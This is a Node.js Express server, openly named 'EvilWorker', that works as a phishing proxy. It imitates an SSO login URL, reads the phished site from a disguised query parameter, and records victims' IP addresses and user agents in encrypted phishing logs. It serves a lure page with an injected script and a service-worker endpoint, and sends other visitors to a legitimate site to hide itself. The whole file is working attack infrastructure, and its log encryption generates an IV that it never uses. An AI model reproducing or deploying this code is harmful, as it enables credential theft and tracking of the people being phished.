const express = require('express');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const port = process.env.PORT || 3000;

// EvilWorker configuration
const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
const PHISHED_URL_PARAMETER = "redirect_urI";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://www.intrinsec.com/";

const PROXY_FILES = {
    index: "index_smQGUDpTF7PN.html",
    notFound: "404_not_found_lk48ZVr32WvU.html",
    script: "script_Vx9Z6XN5uC3k.js"
};

const PROXY_PATHNAMES = {
    proxy: "/lNv1pC9AWPUY4gbidyBO",
    serviceWorker: "/service_worker_Mz8XO2ny1Pg5.js"
};

// Encryption key for logs
const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";

// Create logs directory if it doesn't exist
const logsDir = path.join(__dirname, 'phishing_logs');
if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir, { recursive: true });
}

// Log function
function logPhishingData(data) {
    const timestamp = new Date().toISOString();
    const logEntry = {
        timestamp,
        data: data,
        encrypted: true
    };

    // Encrypt the data
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipher('aes-256-ctr', ENCRYPTION_KEY);
    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    logEntry.data = iv.toString('hex') + ':' + encrypted;

    const logFile = path.join(logsDir, 'phishing_logs.json');
    let logs = [];
    
    if (fs.existsSync(logFile)) {
        try {
            logs = JSON.parse(fs.readFileSync(logFile, 'utf8'));
        } catch (e) {
            logs = [];
        }
    }
    
    logs.push(logEntry);
    fs.writeFileSync(logFile, JSON.stringify(logs, null, 2));
}

// Main phishing endpoint
app.get('/login', (req, res) => {
    const queryString = req.url.split('?')[1] || '';
    const fullUrl = `/login?${queryString}`;
    
    if (fullUrl.includes(PROXY_ENTRY_POINT)) {
        const match = fullUrl.match(PHISHED_URL_REGEXP);
        if (match) {
            const phishedUrl = decodeURIComponent(match[0]);
            logPhishingData({
                type: 'phishing_attempt',
                original_url: phishedUrl,
                user_agent: req.headers['user-agent'],
                ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
                timestamp: new Date().toISOString()
            });
            
            // Serve the phishing page
            const indexPath = path.join(__dirname, PROXY_FILES.index);
            if (fs.existsSync(indexPath)) {
                let html = fs.readFileSync(indexPath, 'utf8');
                
                // Inject the script
                const scriptPath = path.join(__dirname, PROXY_FILES.script);
                if (fs.existsSync(scriptPath)) {
                    const script = fs.readFileSync(scriptPath, 'utf8');
                    html = html.replace('</head>', `<script>${script}</script></head>`);
                }
                
                res.setHeader('Content-Type', 'text/html');
                res.send(html);
            } else {
                res.status(404).send('Page not found');
            }
        } else {
            res.redirect(REDIRECT_URL);
        }
    } else {
        res.redirect(REDIRECT_URL);
    }
});

// Service worker endpoint
app.get('/service_worker_Mz8XO2ny1Pg5.js', (req, res) => {
    const serviceWorkerPath = path.join(__dirname, 'service_worker_Mz8XO2ny1Pg5.js');
    if (fs.existsSync(serviceWorkerPath)) {
        res.setHeader('Content-Type', 'application/javascript');
        res.send(fs.readFileSync(serviceWorkerPath, 'utf8'));
    } else {
        res.status(404).send('Service worker not found');
    }
});

// 404 page
app.get('/404_not_found_lk48ZVr32WvU.html', (req, res) => {
    const notFoundPath = path.join(__dirname, PROXY_FILES.notFound);
    if (fs.existsSync(notFoundPath)) {
        res.setHeader('Content-Type', 'text/html');
        res.send(fs.readFileSync(notFoundPath, 'utf8'));
    } else {
        res.status(404).send('404 Not Found');
    }
});

// Default route - redirect to legitimate site
app.get('*', (req, res) => {
    res.redirect(REDIRECT_URL);
});

app.listen(port, () => {
    console.log(`EvilWorker running on port ${port}`);
    console.log(`Phishing endpoint: ${PROXY_ENTRY_POINT}`);
});
